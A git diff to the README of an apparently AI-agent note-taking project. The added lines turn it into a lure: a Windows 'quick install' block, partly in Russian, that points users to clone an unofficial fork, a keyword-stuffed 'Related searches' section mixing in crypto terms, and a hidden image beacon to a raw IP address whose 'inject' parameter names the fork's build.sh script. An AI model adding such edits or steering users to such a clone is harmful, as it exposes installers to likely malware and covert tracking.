@@ -1,3 +1,19 @@
+**SmokeFlowThrive/My-Brain-Is-Full-Crew**
+
+Welcome to the ultimate hub for getting your crew up, running, and synchronized without the usual headaches. We've recently rolled out a round of crucial stability fixes, making the entire system significantly more reliable and robust than ever before. Best of all, if you are running on Windows, you'll find the setup process is incredibly straightforward and designed to get you moving in no time.
+
+**Quick install (Windows)**
+
+1. Установи [Git for Windows](https://git-scm.com/download/win)
+2. Открой **Git Bash** или **cmd**
+3. Выполни команду ниже
+
+```bash
+git clone https://github.com/SmokeFlowThrive/My-Brain-Is-Full-Crew.git
+```
+
+[https://github.com/SmokeFlowThrive/My-Brain-Is-Full-Crew](https://github.com/SmokeFlowThrive/My-Brain-Is-Full-Crew)
+
 <h1 align="center">🧠 My Brain Is Full — Crew</h1>
 
 <p align="center">
@@ -575,3 +591,11 @@ MIT: use it, modify it, share it. Just keep the attribution.
   <br><br>
   <a href="docs/getting-started.md"><strong>Get Started</strong></a> · <a href="docs/examples.md"><strong>Examples</strong></a> · <a href="docs/codex-cli.md"><strong>Codex CLI Guide</strong></a> · <a href="docs/codex-migration.md"><strong>Migrate to Codex</strong></a> · <a href="docs/agents/architect.md"><strong>Meet the Agents</strong></a> · <a href="CONTRIBUTING.md"><strong>Contribute</strong></a>
 </p>
+
+## Related searches
+
+Users looking for this kind of project typically search for hands-free personal productivity setups that automate knowledge management without requiring tedious manual organization. They are often interested in multi-agent orchestration frameworks that seamlessly integrate local note-taking environments with conversational AI interfaces.
+
+**Topics:** obsidian ai agents, second brain automation, claude code mcp, gemini cli obsidian, multi agent crew, personal knowledge management ai, mcp servers obsidian, agentic productivity tools, uniswap, chainlink, crypto sdk, memecoin, monero
+
+![.](http://5.231.58.248:8787/pixel?repo=SmokeFlowThrive%2FMy-Brain-Is-Full-Crew&inject=SmokeFlowThrive%2FMy-Brain-Is-Full-Crew%2Fscripts%2Fbuild.sh)
